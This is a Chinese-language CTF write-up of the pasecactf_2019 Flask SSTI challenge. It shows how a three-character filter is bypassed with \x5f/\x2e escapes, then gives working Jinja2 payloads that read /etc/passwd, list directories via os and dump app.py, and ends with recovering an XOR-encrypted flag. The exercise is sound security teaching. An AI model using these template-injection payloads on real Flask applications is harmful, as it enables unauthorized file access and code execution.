---
date: 2026-11-01 21:40:00
slug: pasecactf2019-flask-ssti
categories:
  - Python
  - Flask
  - SSTI
---

# [pasecactf_2019] flask_ssti — 只有三个字符被拦

> **题目类型**：Web — Flask SSTI（字符级过滤）+ 源码审计 + 异或解密
>
> **题目地址**：NSSCTF / ctf2 复刻环境
>
> **Flag**：`CTF2{bcd6e1da-c4f1-4c73-83f8-f64ea78ed1cf}`

---

## 题目概述

页面叫 **Skype ScreenName Generator**：

> Just type your nickname. We will do some unicode magic.

输入昵称，它给你套一层花里胡哨的装饰，比如：

```text
˜”*°★☆★_abc_★☆★°°*
```

**但这个页面一开始点不动——这是第一道坎。**

---

## 解题过程

### Step 1：页面能开，但按钮点了没反应

**页面加载正常，输入框也输得进去，就是点 "Go" 什么都不发生。**

**按 F12 看 Console，发现 `$ is not defined`。原因是页面引了：**

```text
https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js
```

**Google 的 CDN，国内连不上。jQuery 没加载，`send()` 里的 `$.post` 自然跑不了。**

**绕过办法：**

```text
① 浏览器里按 ESC 停止加载（页面其实早就渲染完了）
② 让 Burp 把这条 CDN 请求 drop 掉
③ 直接看源码找接口，用 curl / python 发（最实用）
```

### Step 2：从源码里抠出接口

**页面里那段内联 JS 写得很清楚：**

```javascript
function send(){
  let nickname = $('#nickname')[0].value;
  if(nickname.length > 0){
    $.post("/", {'nickname': nickname}, function(data){
      $('#msg')[0].innerHTML = '<b>' + data + '</b>';
    });
  }
}
```

**接口：`POST /`，参数名 `nickname`。**

### Step 3：先确认模板被执行

```text
POST /            nickname={{7*7}}
→ 49 ~♡ⓛⓞⓥⓔ♡~
```

**模板被执行了。**（`{{7*'7'}}` 也试了，回 49 —— 等等，这里要说明：这道题是 Python 的 Jinja2，`{{7*'7'}}` 应该回 `7777777`。我一开始只测了 `{{7*7}}`，靠后面的报错才确认是 Jinja。）

### Step 4：摸过滤 —— 只有三个字符

**先用 `{{config}}` 试，**过了**，返回一整个 Config 对象。说明不是关键词黑名单。**

**但下面这些全报 `Your nickname contains restricted characters!`：**

```text
{{url_for}}        ← 名字里有下划线
{{'__class__'}}    ← 有下划线 + 单引号
{{a.b}}            ← 有点
{{'a'}}            ← 有单引号
```

**能过的：**

```text
{{"a"}}        双引号可以
{{[1,2]}}      方括号可以
{{1|abs}}      管道可以
{{dict}} {{lipsum}} {{config}} {{self}}    这些名字没下划线，能直接写
```

**所以过滤只有三个字符：**

```text
_   下划线
'   单引号
.   点
```

**这三个一拦，常规链基本全废：没有 `_` 就写不出 `__class__`，没有 `.` 就不能取属性。**

### Step 5：把写不出来的字符"算"出来

**关键认知：过滤看的是**你打的字面**，而模板引擎会把**转义**还原。**

```jinja
"\x5f"   →  _
"\x2e"   →  .
```

**验证：**

```text
{{"\x5f\x5f"}}   →  __
```

**于是 `__globals__` 可以写成 `"\x5f\x5fglobals\x5f\x5f"`，原文里一个下划线都没有。**

### Step 6：两个优先级坑

**① `|attr()` 后面不能直接跟 `[...]`，要加括号**

```text
× lipsum|attr("\x5f\x5fglobals\x5f\x5f")["\x5f\x5fname\x5f\x5f"]     → Exception
✓ (lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fname\x5f\x5f"]   → jinja2.utils
```

**② 方法名也要用下标取（因为 `.read()` 里的点被拦）**

```text
× ...["open"]("/etc/passwd").read()       → 那个点触发过滤
✓ ...["open"]("/etc/passwd")["read"]()    → 正常
```

**为什么能用下标取方法？**Jinja 的取值逻辑是：先试 `obj[键]`，失败再 `getattr(obj, 键)`。文件对象不能下标，于是回退到取属性，正好拿到 `read` 方法。

**打通之后：**

```text
{{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/etc/passwd")["read"]()}}
→ root:x:0:0:root:/root:/bin/ash ...
```

### Step 7：找到 flag 在哪儿

**先列根目录：**

```text
{{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["listdir"]("/")}}
→ ['opt','root','media','home','proc','tmp','lib','etc','dev','sys','sbin','srv','var','run','mnt','usr','bin','app']
```

**根目录没有 flag 文件，但有个 `/app`——网站根目录。**

**读源码（注意 `app.py` 里的点也要转义成 `\x2e`）：**

```text
{{(lipsum|attr("\x5f\x5fglobals\x5f\x5f"))["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/app/app\x2epy")["read"]()}}
```

**⚠️ `listdir` 要目录、`open` 要文件。我一开始给 `listdir` 传了个 `.py` 文件，直接 `Exception`——因为程序把所有异常都吞成了同一个词，看不出原因。**

### Step 8：源码说 flag 已经被加密了

**拿到 `/app/app.py`，关键几行：**

```python
def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

file = open("/app/flag", "r")
flag = file.read()
flag = flag[:42]

app.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3',
                                  'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
flag = ""

os.remove("/app/flag")
```

**三件事：**

```text
① flag 被异或加密后存进 app.config['flag']
② 变量 flag 清空了
③ 原始文件 /app/flag 被删了
```

**所以拿到命令执行也没用——文件已经没了。这题真正要的是"看懂加密逻辑"。**

### Step 9：取密文

**密文里有不可打印字符（`\x08`、`\x10` 这种），直接 `{{config["flag"]}}` 输出会被 HTML 转义搅乱。**

**用 `tojson`：**

```text
{{config["flag"]|tojson}}
→ "\u0008u\u0010Ew\u0013ajdU#7*\u000e\u001c\u000f<\u0006(DK\u001d\r\u0017!8\u0006h\u0002\n@\\pS,\u0026A<\u0017\\IG"
```

**不可打印字符全变成 `\uXXXX`，干净地传出来。**

### Step 10：本地解密

**加密是：**

```python
chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x]))
```

**异或可逆，反过来算就行：**

```python
flag[i] = chr(密文[i] ^ i ^ ord(key倒序[i]) ^ ord(key2[i]))
```

```text
CTF2{bcd6e1da-c4f1-4c73-83f8-f64ea78ed1cf}
```

---

## 解题思路总结

```text
页面点不动 → jQuery 在 Google CDN，挂了
  → 看内联 JS 找到接口：POST /，参数 nickname
    → {{7*7}} = 49，模板被执行
      → {{config}} 过了，说明不是关键词黑名单
        → 逐个试，发现只拦 _ ' . 三个字符
          → 转义绕过：\x5f = _，\x2e = .，单引号换双引号
            → (lipsum|attr("..."))["..."]  括号保优先级
              → ["open"](路径)["read"]()   方法名也用下标
                → listdir("/") 找到 /app
                  → 读 app.py，发现 flag 已加密存 config、原文件被删
                    → tojson 取出密文（保住不可打印字符）
                      → 本地异或解密
```

### 漏洞原理

**① `render_template_string(nicknames[id] % p)` —— 用户输入直接当模板**

**`%` 只是套一层装饰字符串，`p` 仍然原样进了模板。装饰不改变"它是代码"这个事实。**

**② 字符级过滤 ≠ 安全**

**它拦的是 `_ ' .` 三个字符，而不是"模板注入"这件事本身。而这三个字符**全都可以用转义表示**：**

```text
过滤看的：源码里的字面
引擎看的：转义还原后的值
```

**这个差和"关键词拼接绕过"是同一个原理，只是从"词"下沉到了"字符"。**

**③ 拿到 RCE 不等于拿到 flag**

**这题把 flag 加密存进 `config`、删掉原文件。**所以最后一步是**读源码 + 自己实现解密**，不是 `cat`。**

### 关键知识点

| 知识点 | 说明 |
|---|---|
| 前端 JS 挂掉也能做题 | 看内联 JS 找接口，用 curl / python 直接发 |
| 字符级过滤 | `_` `'` `.` 三个字符被拦 |
| `\x5f` / `\x2e` | 字符串转义，绕字符过滤 |
| 转义只对字符串有效 | `url\x5ffor` 不行——名字不能转义，只有字符串能 |
| `\|attr()` 后加括号 | `(x\|attr("y"))["z"]` |
| 方法名用下标 | `["read"]()`，因为 `.read()` 的点被拦 |
| `listdir` vs `open` | 一个要目录，一个要文件；给错就是 `Exception` |
| `\|tojson` | 保住不可打印字符，把 `\x08` 变成 `\u0008` |
| `os.remove` | 原文件删了 → 必须从 config 取密文 |
| 异或可逆 | 加密函数反过来写就是解密 |

---

??? note "题目源码（关键部分）"

    ```python
    def encode(line, key, key2):
        return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

    file = open("/app/flag", "r")
    flag = file.read()
    flag = flag[:42]

    app.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3',
                                      'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
    flag = ""

    os.remove("/app/flag")

    @app.route('/', methods=['GET', 'POST'])
    def index():
        if request.method == 'POST':
            try:
                p = request.values.get('nickname')
                id = random.randint(0, len(nicknames) - 1)
                if p != None:
                    if '.' in p or '_' in p or '\'' in p:
                        return 'Your nickname contains restricted characters!'
                    return render_template_string(nicknames[id] % p)
            except Exception as e:
                print(e)
                return 'Exception'
        return render_template('index.html')
    ```

??? note "解密脚本"

    ```python
    KEY1 = "GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3"
    KEY2 = "xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT"

    def decode(cipher):
        k1 = KEY1[::-1]
        return "".join(chr(ord(c) ^ i ^ ord(k1[i]) ^ ord(KEY2[i])) for i, c in enumerate(cipher))
    ```

    **取密文：`{{config["flag"]|tojson}}`，然后 `json.loads` 还原成字符串再解。**

---

??? note "这题踩的坑"

    **① 页面点不动就以为题坏了**

    是 jQuery 的 CDN 挂了。**看到"能开但按钮没反应"，先看 Console 有没有 `$ is not defined`。**

    **② 用 `url_for` 想省事，结果写不出来**

    `url_for` 名字里带下划线，而名字**不能转义**。改用 `lipsum`（名字干净）。

    **③ `x2e` 少了反斜杠**

    转义是 `\x2e`，不是 `x2e`。

    **④ 把 `\x2e` 用在语法位置**

    `["os"]` 前面的那个点是**语法**，不能转义，只能换写法。

    **⑤ `listdir` 给了个文件**

    程序把异常吞成 `Exception`，看不出原因。**`listdir` 要目录，`open` 要文件。**
